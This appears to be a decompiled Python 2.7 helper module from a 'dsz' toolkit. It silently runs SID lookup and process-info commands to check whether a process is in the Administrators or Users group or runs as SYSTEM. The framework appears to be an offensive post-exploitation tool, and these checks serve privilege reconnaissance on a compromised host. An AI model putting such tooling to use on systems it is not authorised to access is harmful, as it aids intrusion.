# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz

def _getWellKnownSid(name):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not dsz.cmd.Run('sidlookup -wellknown %s' % name, dsz.RUN_FLAG_RECORD):
        return name
    name = dsz.cmd.data.Get('Sid::Name', dsz.TYPE_STRING)
    return name[0]


def GetGroups(id=0):
    idStr = ''
    if id != 0:
        idStr = '-id %s' % id
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not dsz.cmd.Run('processinfo %s' % idStr, dsz.RUN_FLAG_RECORD):
        raise RuntimeError, 'Command failed'
    return dsz.cmd.data.Get('ProcessInfo::Groups::Group::Name', dsz.TYPE_STRING)


def IsInAdminGroup(id=0):
    name = _getWellKnownSid('Administrators')
    return IsInGroup(name, id)


def IsInGroup(groupName, id=0):
    name = groupName.lower()
    try:
        groups = GetGroups(id)
        for group in groups:
            if name == group.lower():
                return True

    except:
        pass

    return False


def IsInUsersGroup(id=0):
    name = _getWellKnownSid('Users')
    return IsInGroup(name, id)


def IsSystem(id=0):
    name = _getWellKnownSid('System')
    user = dsz.process.GetUser(id)
    return user.lower() == name.lower()